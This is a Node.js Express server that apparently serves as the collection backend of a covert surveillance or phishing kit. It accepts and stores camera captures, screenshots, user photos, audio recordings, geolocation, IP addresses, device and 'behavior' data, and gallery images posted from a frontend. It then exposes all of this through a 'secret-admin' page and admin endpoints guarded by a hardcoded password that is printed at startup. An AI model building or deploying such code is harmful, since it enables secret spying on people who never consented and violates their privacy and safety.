const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 8080;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

let allData = [];
let idCounter = 1;

// Admin Password
const ADMIN_PASSWORD = 'admin123#@!';

// ===== ROUTES =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/secret-admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
});

// ===== STORE DATA =====
app.post('/api/store', (req, res) => {
    try {
        const { cameraImage, location, deviceDetails, screenshot, userPhoto, audioData, ipAddress, behaviorData } = req.body;
        allData.unshift({
            _id: 'id_' + idCounter++,
            cameraImage: cameraImage || null,
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            screenshot: screenshot || null,
            userPhoto: userPhoto || null,
            audioData: audioData || null,
            ipAddress: ipAddress || 'Unknown',
            behaviorData: behaviorData || {},
            timestamp: new Date().toISOString()
        });
        console.log('✅ Stored! Total:', allData.length);
        res.json({ success: true, message: 'Data stored!', id: 'id_' + (idCounter-1) });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

// ===== STORE GALLERY PHOTOS =====
app.post('/api/store-gallery', (req, res) => {
    try {
        const { image, fileName, location, deviceDetails } = req.body;
        allData.unshift({
            _id: 'gallery_' + idCounter++,
            type: 'gallery',
            image: image || null,
            fileName: fileName || 'unknown.jpg',
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            timestamp: new Date().toISOString()
        });
        console.log('✅ Gallery Photo Stored! Total:', allData.length);
        res.json({ success: true, message: 'Gallery photo stored!' });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

// ===== GET IP =====
app.get('/api/get-ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    res.json({ success: true, ip: ip });
});

// ===== ADMIN - GET DATA =====
app.post('/api/admin/get-data', (req, res) => {
    try {
        const { password } = req.body;
        if (password !== ADMIN_PASSWORD) {
            return res.json({ success: false, message: '❌ Wrong password!' });
        }
        res.json({ success: true, count: allData.length, data: allData });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

// ===== ADMIN - DELETE DATA =====
app.post('/api/admin/delete', (req, res) => {
    try {
        const { password, id } = req.body;
        if (password !== ADMIN_PASSWORD) {
            return res.json({ success: false, message: '❌ Wrong password!' });
        }
        allData = allData.filter(item => item._id !== id);
        res.json({ success: true });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

// ===== START =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
});
